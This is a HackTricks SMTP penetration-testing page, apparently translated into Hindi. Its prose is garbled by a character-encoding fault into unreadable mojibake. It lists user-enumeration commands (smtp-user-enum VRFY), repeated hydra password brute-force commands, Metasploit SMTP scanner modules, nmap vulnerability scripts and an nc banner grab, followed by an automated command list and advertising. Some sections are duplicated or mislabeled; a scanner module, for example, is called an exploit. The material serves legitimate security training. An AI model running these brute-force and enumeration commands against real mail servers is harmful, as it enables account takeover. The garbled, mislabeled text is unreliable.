рдХрд╛рд░реНрдпрд╛рдиреНрд╡рд┐рдд рд╣реЛрдЧрд╛ред

рдЕрдиреНрдп рдХреЙрдиреНрдлрд╝рд┐рдЧ рдлрд╝рд╛рдЗрд▓реЗрдВ:
```
sendmail.cf
submit.cf
```
## HackTricks рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдЖрджреЗрд╢

### SMTP

#### рдИрдореЗрд▓ рдЖрдИрдбреА рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдПрдВ

рдпрджрд┐ рдЖрдкрдХреЛ рдПрдХ рдИрдореЗрд▓ рдЖрдИрдбреА рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдирд╛ рд╣реИ, рддреЛ рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЖрджреЗрд╢ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

```bash
smtp-user-enum -M VRFY -U /path/to/usernames.txt -t <target_ip>
```

рдпрд╣ рдЖрджреЗрд╢ рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рд╕реВрдЪреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ SMTP рд╕рд░реНрд╡рд░ рдкрд░ рдИрдореЗрд▓ рдЖрдИрдбреА рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдЧрд╛ред

#### SMTP рдмреНрд░реВрдЯрдлреЛрд░реНрд╕рд┐рдВрдЧ

SMTP рд╕рд░реНрд╡рд░ рдкрд░ рдмреНрд░реВрдЯрдлреЛрд░реНрд╕рд┐рдВрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЖрджреЗрд╢ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

```bash
smtp-user-enum -M VRFY -U /path/to/usernames.txt -t <target_ip>
```

рдпрд╣ рдЖрджреЗрд╢ рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рд╕реВрдЪреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ SMTP рд╕рд░реНрд╡рд░ рдкрд░ рдмреНрд░реВрдЯрдлреЛрд░реНрд╕рд┐рдВрдЧ рдХрд░реЗрдЧрд╛ред

#### SMTP рдПрдХреНрд╕реНрдкреНрд▓реЛрдЗрдЯ

SMTP рд╕рд░реНрд╡рд░ рдкрд░ рдПрдХреНрд╕реНрдкреНрд▓реЛрдЗрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЖрджреЗрд╢ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

```bash
msfconsole
use auxiliary/scanner/smtp/smtp_enum
set RHOSTS <target_ip>
run
```

рдпрд╣ рдЖрджреЗрд╢ Metasploit рдлреНрд░реЗрдорд╡рд░реНрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ SMTP рд╕рд░реНрд╡рд░ рдХреЛ рдПрдХреНрд╕реНрдкреНрд▓реЛрдЗрдЯ рдХрд░реЗрдЧрд╛ред

#### SMTP рд╡реЗрдм рд╕рд░реНрд╡рд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛

SMTP рд╕рд░реНрд╡рд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЖрджреЗрд╢ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

```bash
telnet <target_ip> 25
```

рдпрд╣ рдЖрджреЗрд╢ рдЖрдкрдХреЛ SMTP рд╕рд░реНрд╡рд░ рдХреЗ рд╕рд╛рде рдПрдХ рдЯреЗрд▓рдиреЗрдЯ рд╕рддреНрд░ рд╢реБрд░реВ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдЧрд╛ред

#### SMTP рд▓реЙрдЧрд┐рдВрдЧ

SMTP рд╕рд░реНрд╡рд░ рдХреЗ рд▓реЙрдЧ рджреЗрдЦрдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЖрджреЗрд╢ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

```bash
tail -f /var/log/mail.log
```

рдпрд╣ рдЖрджреЗрд╢ рдЖрдкрдХреЛ `/var/log/mail.log` рдлрд╝рд╛рдЗрд▓ рдХреЗ рд▓реЙрдЧ рдХреЛ рд▓рд╛рдЗрд╡ рджреЗрдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдЧрд╛ред

#### SMTP рд╡реЗрдм рдЗрдВрдЯрд░рдлреЗрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛

SMTP рд╕рд░реНрд╡рд░ рдХреЗ рд▓рд┐рдП рд╡реЗрдм рдЗрдВрдЯрд░рдлреЗрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЖрджреЗрд╢ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

```bash
firefox http://<target_ip>:<port>
```

рдпрд╣ рдЖрджреЗрд╢ рдЖрдкрдХреЛ рд╡реЗрдм рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдореЗрдВ SMTP рд╕рд░реНрд╡рд░ рдХреЗ рд▓рд┐рдП рд╡реЗрдм рдЗрдВрдЯрд░рдлреЗрд╕ рдЦреЛрд▓рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдЧрд╛ред

#### SMTP рд╡реЗрдм рдЗрдВрдЯрд░рдлреЗрд╕ рдХреЗ рд▓рд┐рдП рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдкрд╛рд╕рд╡рд░реНрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛

SMTP рд╕рд░реНрд╡рд░ рдХреЗ рд▓рд┐рдП рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдкрд╛рд╕рд╡рд░реНрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЖрджреЗрд╢ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

```bash
hydra -l <username> -P /path/to/passwords.txt <target_ip> smtp -V
```

рдпрд╣ рдЖрджреЗрд╢ рдЖрдкрдХреЛ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдкрд╛рд╕рд╡рд░реНрдб рдХреЗ рд╕рд╛рде SMTP рд╕рд░реНрд╡рд░ рдХреЛ рд╣рд╛рдЗрдбреНрд░рд╛ рдЯреВрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдмреНрд░реВрдЯрдлрд╝реЛрд░реНрд╕ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдЧрд╛ред

#### SMTP рд╡реЗрдм рдЗрдВрдЯрд░рдлреЗрд╕ рдХреЗ рд▓рд┐рдП рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛

SMTP рд╕рд░реНрд╡рд░ рдХреЗ рд▓рд┐рдП рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЖрджреЗрд╢ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

```bash
hydra -L /path/to/usernames.txt -p <password> <target_ip> smtp -V
```

рдпрд╣ рдЖрджреЗрд╢ рдЖрдкрдХреЛ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдХреЗ рд╕рд╛рде SMTP рд╕рд░реНрд╡рд░ рдХреЛ рд╣рд╛рдЗрдбреНрд░рд╛ рдЯреВрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдмреНрд░реВрдЯрдлрд╝реЛрд░реНрд╕ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдЧрд╛ред

#### SMTP рд╡реЗрдм рдЗрдВрдЯрд░рдлреЗрд╕ рдХреЗ рд▓рд┐рдП рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛

SMTP рд╕рд░реНрд╡рд░ рдХреЗ рд▓рд┐рдП рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЖрджреЗрд╢ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

```bash
hydra -L /path/to/usernames.txt -P /path/to/passwords.txt <target_ip> smtp -V
```

рдпрд╣ рдЖрджреЗрд╢ рдЖрдкрдХреЛ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рдХреЗ рд╕рд╛рде SMTP рд╕рд░реНрд╡рд░ рдХреЛ рд╣рд╛рдЗрдбреНрд░рд╛ рдЯреВрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдмреНрд░реВрдЯрдлрд╝реЛрд░реНрд╕ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдЧрд╛ред

#### SMTP рд╡реЗрдм рдЗрдВрдЯрд░рдлреЗрд╕ рдХреЗ рд▓рд┐рдП рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ (рд╡рд┐рд╖рдо рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо)

SMTP рд╕рд░реНрд╡рд░ рдХреЗ рд▓рд┐рдП рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЖрджреЗрд╢ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

```bash
hydra -l <username> -P /path/to/passwords.txt <target_ip> smtp -V
```

рдпрд╣ рдЖрджреЗрд╢ рдЖрдкрдХреЛ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рдХреЗ рд╕рд╛рде SMTP рд╕рд░реНрд╡рд░ рдХреЛ рд╣рд╛рдЗрдбреНрд░рд╛ рдЯреВрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдмреНрд░реВрдЯрдлрд╝реЛрд░реНрд╕ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдЧрд╛ред

#### SMTP рд╡реЗрдм рдЗрдВрдЯрд░рдлреЗрд╕ рдХреЗ рд▓рд┐рдП рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ (рд╡рд┐рд╖рдо рдкрд╛рд╕рд╡рд░реНрдб)

SMTP рд╕рд░реНрд╡рд░ рдХреЗ рд▓рд┐рдП рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЖрджреЗрд╢ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

```bash
hydra -L /path/to/usernames.txt -p <password> <target_ip> smtp -V
```

рдпрд╣ рдЖрджреЗрд╢ рдЖрдкрдХреЛ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рдХреЗ рд╕рд╛рде SMTP рд╕рд░реНрд╡рд░ рдХреЛ рд╣рд╛рдЗрдбреНрд░рд╛ рдЯреВрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдмреНрд░реВрдЯрдлрд╝реЛрд░реНрд╕ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдЧрд╛ред

#### SMTP рд╡реЗрдм рдЗрдВрдЯрд░рдлреЗрд╕ рдХреЗ рд▓рд┐рдП рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ (рд╡рд┐рд╖рдо рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб)

SMTP рд╕рд░реНрд╡рд░ рдХреЗ рд▓рд┐рдП рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЖрджреЗрд╢ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

```bash
hydra -L /path/to/usernames.txt -P /path/to/passwords.txt <target_ip> smtp -V
```

рдпрд╣ рдЖрджреЗрд╢ рдЖрдкрдХреЛ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдФрд░ рдкрд╛рд╕рд╡рд░реНрдб рдХреЗ рд╕рд╛рде SMTP рд╕рд░реНрд╡рд░ рдХреЛ рд╣рд╛рдЗрдбреНрд░рд╛ рдЯреВрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдмреНрд░реВрдЯрдлрд╝реЛрд░реНрд╕ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдЧрд╛ред
```
Protocol_Name: SMTP    #Protocol Abbreviation if there is one.
Port_Number:  25,465,587     #Comma separated if there is more than one.
Protocol_Description: Simple Mail Transfer Protocol          #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for SMTP
Note: |
SMTP (Simple Mail Transfer Protocol) is a TCP/IP protocol used in sending and receiving e-mail. However, since it is limited in its ability to queue messages at the receiving end, it is usually used with one of two other protocols, POP3 or IMAP, that let the user save messages in a server mailbox and download them periodically from the server.

https://book.hacktricks.xyz/pentesting/pentesting-smtp

Entry_2:
Name: Banner Grab
Description: Grab SMTP Banner
Command: nc -vn {IP} 25

Entry_3:
Name: SMTP Vuln Scan
Description: SMTP Vuln Scan With Nmap
Command: nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 {IP}

Entry_4:
Name: SMTP User Enum
Description: Enumerate uses with smtp-user-enum
Command: smtp-user-enum -M VRFY -U {Big_Userlist} -t {IP}

Entry_5:
Name: SMTPS Connect
Description: Attempt to connect to SMTPS two different ways
Command: openssl s_client -crlf -connect {IP}:465 &&&& openssl s_client -starttls smtp -crlf -connect {IP}:587

Entry_6:
Name: Find MX Servers
Description: Find MX servers of an organization
Command: dig +short mx {Domain_Name}

Entry_7:
Name: Hydra Brute Force
Description: Need Nothing
Command: hydra -P {Big_Passwordlist} {IP} smtp -V

Entry_8:
Name: consolesless mfs enumeration
Description: SMTP enumeration without the need to run msfconsole
Note: sourced from https://github.com/carlospolop/legion
Command: msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_version; set RHOSTS {IP}; set RPORT 25; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_ntlm_domain; set RHOSTS {IP}; set RPORT 25; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_relay; set RHOSTS {IP}; set RPORT 25; run; exit'

```
<figure><img src="../../.gitbook/assets/image (1) (1) (2) (4).png" alt=""><figcaption></figcaption></figure>

[**DragonJAR Security Conference**](https://www.dragonjarcon.org/) **рдПрдХ рдЕрдВрддрд░рд░рд╛рд╖реНрдЯреНрд░реАрдп рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрд╛рд░реНрдпрдХреНрд░рдо рд╣реИ** рдЬреЛ 7 рдФрд░ 8 рд╕рд┐рддрдВрдмрд░ 2023 рдХреЛ рдХреЛрд▓рдВрдмрд┐рдпрд╛ рдХреЗ рдмреЛрдЧреЛрдЯрд╛ рдореЗрдВ рдЖрдпреЛрдЬрд┐рдд рд╣реЛрдЧрд╛ред рдпрд╣ рдПрдХ рддрдХрдиреАрдХреА рд╡рд┐рд╖рдп рдкрд░ рдЖрдзрд╛рд░рд┐рдд рдХрд╛рд░реНрдпрдХреНрд░рдо рд╣реИ рдЬрд╣рд╛рдВ рд╕реНрдкреЗрдирд┐рд╢ рдореЗрдВ рдирд╡реАрдирддрдо рд╢реЛрдз рдкреНрд░рд╕реНрддреБрдд рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ рдФрд░ рдпрд╣ рджреБрдирд┐рдпрд╛ рднрд░ рдХреЗ рд╣реИрдХрд░реНрд╕ рдФрд░ рд╢реЛрдзрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдЖрдХрд░реНрд╖рд┐рдд рдХрд░рддрд╛ рд╣реИред\
рдЗрд╕ рдорд╣рд╛рди рд╕рдореНрдореЗрд▓рди рдХреЛ рди рдЫреЛрдбрд╝реЗрдВ, рдиреАрдЪреЗ рджрд┐рдП рдЧрдП рд▓рд┐рдВрдХ рдкрд░ рдЕрднреА рдкрдВрдЬреАрдХрд░рдг рдХрд░реЗрдВ!:

{% embed url="https://www.dragonjarcon.org/" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ**? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреА рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ**? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFT рд╕рдВрдЧреНрд░рд╣**](https://opensea.io/collection/the-peass-family)
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **Twitter** [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдВ**.
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рдХреЛ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ**.

</details>
